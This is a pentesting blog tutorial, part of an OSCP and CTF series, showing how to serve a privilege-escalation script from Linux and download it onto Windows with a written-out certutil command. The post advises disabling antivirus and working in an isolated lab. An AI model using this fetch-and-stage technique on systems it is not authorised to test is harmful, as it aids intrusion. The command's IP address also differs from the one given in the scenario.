---
layout: post
title: 'File Transfers - Part 2: Linux To Windows'
date: '2022-10-24 17:57:48 +0100'
categories: [Tutorial, OSCP]
tags: [linux, windows, oscp, python, file-transfer, pentesting, code, tutorial, ctf]
---

This is part of a series of tutorials on file transfer methods for pentesting and CTF scenarios.

_Disclaimer: It is necessary to disable any Anti-Virus (Windows Defender etc.) and also potentially any Firewalls
on the Windows system for these transfers to work. It is highly recommended to do this in a safe, virtualised environment that is not connected to any public network or the Internet. You're responsible for the security of your own systems. These tutorials are for educational purposes only._

# Linux to Windows File Transfer

In this tutorial, we will cover the use of `certutil.exe` for transferring a file from Linux to a Windows system.

## Scenario

We have a Windows and a Linux system connected to the same local network.

UBUNTU LINUX - 192.168.56.103<br>
WINDOWS 10 - 192.168.56.104

- We want to transfer the file `PrivescCheck.ps1` from LINUX to the WINDOWS system

![file-to-transfer](/assets/img/file-transfers-2/file-to-transfer.png)

- We will transfer the file to `C:\Windows\Tasks` on WINDOWS, since our fresh WINDOWS 10 install gives members of the **Authenticated Users** group write permissions on this directory, and it is currently empty.

![icacls-tasks](/assets/img/file-transfers-2/icacls-tasks.png)
<br>
![empty-dir](/assets/img/file-transfers-2/empty_dir.png)

In order to transfer a file FROM a Linux machine, we need to make it accessible to a remote machine. 
There are a number of ways we can do this. However, for this tutorial we will be using the **Python HTTP Server**.
We covered how to do this in [File Transfers: Part 1](https://dev-0x0.github.io/posts/file-transfers).

## Transferring the File

On our Linux system, we serve the file using the **Python HTTP Server.**

![serve-file](/assets/img/file-transfers-2/serve-file.png)

There are multiple ways we can transfer the file to the Windows system. It's important to know the different methods you can use, as sometimes a system has been configured such that some options are unavailable to you. Therefore, it's good to have as many tools in your toolkit as possible. In this tutorial, we will use the Windows `certutil` tool.

### Certutil.exe

According to [Microsoft](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil), "Certutil.exe is a command-line program, installed as part of Certificate Services". It is generally installed on Windows systems by default. However, we can use **certutil** to transfer files using the following command from our WINDOWS system. Providing a specific download location at the end of the command is generally optional, but may be necessary in certain situations.

`certutil -urlcache -split -f http://192.168.56.102:8000/PrivescCheck.ps1 [DOWNLOAD LOCATION]`
![certutil](/assets/img/file-transfers-2/certutil.png)

Listing the directory on WINDOWS, we can see that the file transferred successfully.

Looking at our **Python HTTP Server** on Linux, we can see the GET request that was made by **certutil**.
Sometimes there are two requests, that's okay.
![get-req1](/assets/img/file-transfers-2/get-req1.png)

## Conclusion

`Certutil.exe` is a very useful tool for file-transfers to Windows systems. Hopefully if you're reading this,
you found something of use here. Please check out the other [File-Transfer tutorials](https://dev-0x0.github.io/tags/file-transfer/) for more. Thanks for reading!









